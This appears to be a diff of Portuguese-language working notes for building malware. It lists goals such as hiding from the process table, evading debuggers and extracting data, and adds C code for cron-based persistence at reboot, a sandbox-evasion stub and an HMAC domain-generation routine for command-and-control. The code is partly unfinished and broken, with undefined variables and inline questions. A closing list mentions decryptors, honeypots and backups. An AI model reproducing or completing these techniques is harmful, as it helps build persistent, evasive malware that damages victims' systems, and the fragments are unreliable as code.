@@ -14,3 +14,47 @@ resolver para https
 esconder da tabela de processos
 fechar quando estiver em aplicações de debug
 resolver para extração de dados
+error: read only file system, permission denied mesmo com chmod?
+
+
+void add_to_crontab() {
+    char path[1024];
+    readlink("/proc/self/exe", path, sizeof(path));
+    --------- correc?
+    ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
+    path[len] = '\0';
+    ---------
+    
+    FILE *cron = fopen("/etc/crontab", "a");
+    fprintf(cron, "@reboot %s\n", path);
+    fclose(cron);
+
+    tratar para n reescrever o path toda vez que reiniciar
+}
+
+// Verificar se está em sandbox
+int is_sandbox() {
+    // Verificar tempo de execução (sandboxes apressam)
+    // Verificar processos comuns (wireshark, procmon)
+    // Verificar tamanho do disco (muito pequeno = VM)
+}
+
+// Usar HMAC ou hash em vez de XOR simples
+#include <openssl/hmac.h>
+
+void domainGenAl_improved(const char *seed, int n, char *output) {
+    unsigned char hash[32];
+    HMAC(EVP_sha256(), seed, strlen(seed), 
+         (unsigned char*)date, strlen(date), 
+         hash, NULL);
+    // Usar hash para gerar domínio
+}
+
+
+Decryptor - Use a chave privada para recuperar arquivos
+
+Monitor de integridade - Detecta quando arquivos são modificados
+
+Honeypot files - Arquivos isca que disparam alertas
+
+Backup automático antes de qualquer operação destrutiva
